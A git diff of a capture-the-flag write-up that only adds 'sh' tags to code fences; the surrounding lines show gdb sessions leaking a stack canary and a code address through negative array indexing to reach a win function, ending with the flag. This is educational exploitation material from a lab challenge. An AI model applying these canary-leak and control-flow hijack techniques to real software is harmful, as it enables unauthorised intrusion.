@@ -144,7 +144,7 @@ printf("index of your first peek? ");
   Lets take a look in gdb. Running the program and setting a breakpoint right before we enter in our first peak value
 
 
-  ```
+  ```sh
 [#0] 0x7ffff7ec2a5d → __GI___libc_read(fd=0x0, buf=0x7ffff7f9eb23 <_IO_2_1_stdin_+131>, nbytes=0x1)
 [#1] 0x7ffff7e4bd74 → _IO_new_file_underflow(fp=0x7ffff7f9eaa0 <_IO_2_1_stdin_>)
 [#2] 0x7ffff7e4d102 → __GI__IO_default_uflow(fp=0x7ffff7f9eaa0 <_IO_2_1_stdin_>)
@@ -160,7 +160,7 @@ Breakpoint 1 at 0x5555555553f1
 
 Lets continue and examine the stack after we input a value
 
-```
+```sh
 gef➤  x/-50gx $sp
 0x7fffffffdae0: 0x0000000000000000      0x0000000000000000
 0x7fffffffdaf0: 0x00007fffffffdac0      0x00007fffffffdac0
@@ -199,26 +199,26 @@ gef➤
 
 ```
 
-```
+```sh
 0x7fffffffdc70: 0x0000003400000005      0x0000000000000000
 0x7fffffffdc80: 0x5049933c3c3399bc      0x2d2c06c91180ab90
 ```
 
 Looking here we can see where the random card values start. Counting up 3 addresses we see the address we set the breakpoint on, which examianing with x/i which gives us the address as an instruction, we see that cards[-3] will give us game+222. We have our leak and can use this to calculate the address of win function.
 
-```
+```sh
 0x7fffffffdba0: 0x00007fffffffdbb0      0xe15d5cb66eeba700
 ```
 
 Looking up the stack, the value 0xe15d5cb66eeba700 jumps out as the canary because it is null terminated. Using the canary function in gdb we can confirm this is the canary.
 
-```
+```sh
 gef➤  canary
 [+] The canary of process 24230 is at 0x7ffff7dc8768, value is 0xe15d5cb66eeba700
 ```
 So now we know that cards[-27] will give us the canary. Next we need the offset between game+222 and our win fucntion.
 
-```
+```sh
 gef➤  x/x *win
 0x555555555239 <win>:   0x20ec8148e5894855
 ```
@@ -267,6 +267,6 @@ target.interactive()
 ```
 
 
-```
+```sh
 lactf{m0n7y_533_m0n7y_d0}
 ```
